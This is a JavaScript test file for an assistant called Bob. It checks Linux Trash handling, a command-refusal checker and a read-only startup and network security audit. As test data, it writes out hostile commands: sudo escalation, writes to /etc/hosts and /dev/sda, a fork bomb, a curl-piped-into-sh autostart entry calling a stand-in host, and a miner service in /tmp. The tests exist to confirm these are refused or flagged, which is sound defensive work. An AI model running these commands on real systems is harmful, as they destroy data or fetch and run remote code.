// Bob on Linux: the desktop Trash, the Run Hand's Linux rules, and the Security Hand read the Linux way.
// Runs the same on any machine (nothing here needs Linux itself).
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { recycle, forgetTrashInfo, usesBin } from '../src/recycle.js';
import { checkCommand } from '../src/hands-run.js';
import { gatherStartup, gatherNetwork, gatherOverview, sayOverviewLinux, sayStartupLinux, sayNetworkLinux, judgeStartupLinux, clamPlan, sayClam } from '../src/security-linux.js';
import { securityTools } from '../src/hands-security.js';

let pass = 0, fail = 0;
const check = (name, ok, extra) => { if (ok) { pass++; console.log(`PASS ${name}`); } else { fail++; console.log(`FAIL ${name}${extra ? ` (${String(extra).slice(0, 300)})` : ''}`); } };
const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'bob-linux-'));

// ---------- the desktop Trash (freedesktop.org) ----------
{
  const data = path.join(tmp, 'inn', 'bob'); fs.mkdirSync(data, { recursive: true });
  const cfg = { dataDir: data, innDir: path.join(tmp, 'inn'), painterDir: path.join(tmp, 'inn', 'painter'), recycleBin: true, desktopTrashDir: path.join(tmp, 'Trash') };
  const f = path.join(data, 'old notes #1.txt'); fs.writeFileSync(f, 'x');
  const r = recycle(cfg, [f]);
  const info = path.join(cfg.desktopTrashDir, 'info', 'old notes #1.txt.trashinfo');
  check('Linux: a thrown-away file goes to the desktop Trash', r.gone.length === 1 && !fs.existsSync(f) && fs.existsSync(path.join(cfg.desktopTrashDir, 'files', 'old notes #1.txt')));
  const note = fs.existsSync(info) ? fs.readFileSync(info, 'utf8') : '';
  check('Linux: it leaves a .trashinfo the file manager can restore from', /^\[Trash Info\]\nPath=.*\/old%20notes%20%231\.txt\nDeletionDate=\d{4}-\d\d-\d\dT\d\d:\d\d:\d\d\n$/.test(note), note);
  fs.writeFileSync(f, 'y');
  const r2 = recycle(cfg, [f]);
  check('Linux: a second one with the same name gets its own name', r2.trashed[f]?.endsWith('old notes #1.2.txt'));
  fs.renameSync(r2.trashed[f], f); forgetTrashInfo(r2.trashed[f]);
  check('Linux: Undo takes the .trashinfo away too', !fs.existsSync(path.join(cfg.desktopTrashDir, 'info', 'old notes #1.2.txt.trashinfo')) && fs.existsSync(info));
  check('Linux: outside the allowed folders is still refused', recycle(cfg, ['/etc/hostname']).refused.length === 1);
  check('Linux from source (no Electron) keeps Bob\'s own trash folder', usesBin({}, 'linux') === Boolean(process.versions.electron) && usesBin({ recycleBin: false }, 'linux') === false);
}

// ---------- the Run Hand's Linux rules ----------
{
  const cfg = { hands: { enabled: true, run: { on: true } }, readRoots: [tmp], readOnlyRoots: [] };
  const no = (cmd, args, re) => { const r = checkCommand(cfg, { cmd, args, cwd: tmp }); return !r.ok && (!re || re.test(r.why)); };
  const yes = (cmd, args) => checkCommand(cfg, { cmd, args, cwd: tmp }).ok;
  check('Run: sudo, pkexec, doas and su are refused', no('bash', ['-c', 'sudo apt install x'], /administrator/) && no('pkexec', ['ls']) && no('doas', ['ls']) && no('bash', ['-c', 'su - root']));
  check('Run: rm -r and find -delete are refused (the Files Hand throws things away)', no('rm', ['-r', 'build'], /many files/) && no('find', ['.', '-name', '*.o', '-delete']));
  check('Run: writing into /etc or a raw disk is refused', no('bash', ['-c', 'echo x > /etc/hosts'], /system files/) && no('bash', ['-c', 'cat x > /dev/sda'], /raw disks/));
  check('Run: services, cron and the firewall are refused', no('systemctl', ['enable', 'x']) && no('crontab', ['-e']) && no('ufw', ['disable']));
  check('Run: a fork bomb is refused', no('bash', ['-c', ':(){ :|:& };:']));
  check('Run: everyday developer commands still run', yes('ls', ['-la']) && yes('chmod', ['+x', 'run.sh']) && yes('npm', ['test']) && yes('git', ['status']) && yes('rm', ['old.log']));
}

// ---------- the Security Hand, the Linux way ----------
{
  const root = path.join(tmp, 'root'), home = path.join(tmp, 'home');
  const auto = path.join(home, '.config', 'autostart'); fs.mkdirSync(auto, { recursive: true });
  fs.writeFileSync(path.join(auto, 'good.desktop'), '[Desktop Entry]\nName=Syncthing\nExec=/usr/bin/syncthing serve\n');
  fs.writeFileSync(path.join(auto, 'bad.desktop'), '[Desktop Entry]\nName=Updater\nExec=sh -c "curl -s http://x.example/a | sh"\n');
  fs.writeFileSync(path.join(auto, 'off.desktop'), '[Desktop Entry]\nName=Chat\nExec=/usr/bin/chat\nX-GNOME-Autostart-enabled=false\n');
  fs.mkdirSync(path.join(root, 'var/log/apt'), { recursive: true }); fs.writeFileSync(path.join(root, 'var/log/apt/history.log'), '');
  fs.mkdirSync(path.join(root, 'run'), { recursive: true }); fs.writeFileSync(path.join(root, 'run/reboot-required'), '');
  const calls = [];
  const run = async (file, args) => {
    calls.push([file, ...args].join(' '));
    if (file === 'systemctl' && args[0] === 'is-active') return args[1] === 'ufw' ? 'active\n' : 'inactive\n';
    if (file === 'systemctl' && args.includes('list-unit-files')) return 'miner.service enabled enabled\n';
    if (file === 'systemctl' && args.includes('show')) return '/tmp/.x/miner --pool x\n';
    if (file === 'crontab') return '# comment\nMAILTO=me\n@reboot /home/sam/backup.sh\n';
    if (file === 'ss') return 'LISTEN 0 4096 127.0.0.1:7777 0.0.0.0:* users:(("bob",pid=42,fd=3))\nLISTEN 0 128 0.0.0.0:22 0.0.0.0:*\nLISTEN 0 128 [::]:631 [::]:*\n';
    return '';
  };
  const env = { HOME: home, XDG_CONFIG_HOME: path.join(home, '.config') };
  const st = await gatherStartup({ env, run, home, root });
  const text = sayStartupLinux(st);
  check('startup: autostart files, user services and crontab are all listed', st.items.length === 5, JSON.stringify(st.items));
  check('startup: curl piped into sh is the worst mark', /^⛔ Updater/m.test(text));
  check('startup: a service running from /tmp is flagged', /⚠ miner\.service[^\n]*temporary/.test(text));
  check('startup: one switched off in the desktop settings says so', /Chat \(switched off\)/.test(text));
  check('startup: Bob says where to switch them off and that he only looks', /Startup Applications/.test(text) && /only looks/.test(text));
  const net = sayNetworkLinux(await gatherNetwork({ run }));
  check('network: ss is read (Bob on 7777 is local; SSH open to the network is flagged)', /1 only reachable[^\n]*7777 bob/.test(net) && /Remote sign-in is open: 22/.test(net), net);
  const ov = sayOverviewLinux(await gatherOverview({ env: { BOB_CLAMSCAN: '' }, run, root }));
  check('overview: no antivirus is explained as normal on Linux, not a scare', /No antivirus is installed\. That is normal on Linux/.test(ov) || /ClamAV is installed/.test(ov), ov);
  check('overview: firewall, last update and a waiting restart are read', /firewall is running \(ufw\)/.test(ov) && /Last system update: today/.test(ov) && /waiting for a restart/.test(ov), ov);
  check('nothing it runs needs sudo or changes anything', calls.every((c) => !/sudo|enable |disable |start |stop /.test(c.replace('--state=enabled', ''))), calls.join(' | '));
  check('a normal autostart program looks normal', judgeStartupLinux({ command: '/usr/bin/syncthing serve' }).level === 0);

  const fakeClam = path.join(tmp, 'clamscan'); fs.writeFileSync(fakeClam, '');
  let ran = null;
  const brain = { cfg: { hands: { enabled: true, security: { on: true } }, readRoots: [tmp], readOnlyRoots: [] }, log() {} };
  const t = securityTools(brain, { os_: 'linux', env: { ...env, BOB_CLAMSCAN: fakeClam }, linux: { run, home, root, clam: async (k, target) => { ran = { k, target }; return { code: 1, out: `${target}/x.exe: Win.Trojan.Agent FOUND\n` }; } } });
  check('Linux: the scan tool talks about ClamAV, not Defender', /ClamAV/.test(t.defender_scan.schema.function?.description || JSON.stringify(t.defender_scan.schema)) && !/Microsoft Defender scan/.test(JSON.stringify(t.defender_scan.schema)));
  const card = t.defender_scan.check({ kind: 'file', path: tmp });
  check('Linux: a scan shows a card with the exact clamscan command', /Scan with ClamAV \(just this\)/.test(card.text) && card.command === `clamscan --recursive --infected --no-summary ${tmp}`);
  const r = await t.defender_scan.run({ kind: 'file', path: tmp }, {});
  check('Linux: what ClamAV finds is reported, and nothing is moved', ran?.k === 'file' && /found 1 thing/.test(r) && /nothing was moved/.test(r));
  check('Linux: full and update scans explain they need administrator rights', (() => { try { clamPlan('update'); return false; } catch (e) { return /administrator/.test(e.message); } })() && (() => { try { clamPlan('full'); return false; } catch (e) { return /administrator/.test(e.message); } })());
  const noClam = securityTools(brain, { os_: 'linux', env: { ...env, BOB_CLAMSCAN: '' } });
  check('Linux: no ClamAV says how to get it', process.platform !== 'linux' || fs.existsSync('/usr/bin/clamscan') || (() => { try { noClam.defender_scan.check({ kind: 'quick' }); return false; } catch (e) { return /software centre/.test(e.message); } })());
  check('Linux: security_check answers the Linux way', /things start when you sign in/.test(await t.security_check.run({ area: 'startup' }, {})) && /no antivirus history/.test(await t.security_check.run({ area: 'threats' }, {})));
  check('clean ClamAV result says so', /found nothing/.test(sayClam('quick', { code: 0, out: '' })));
}

fs.rmSync(tmp, { recursive: true, force: true });
console.log(`\n${pass} passed, ${fail} failed`);
process.exit(fail ? 1 : 0);
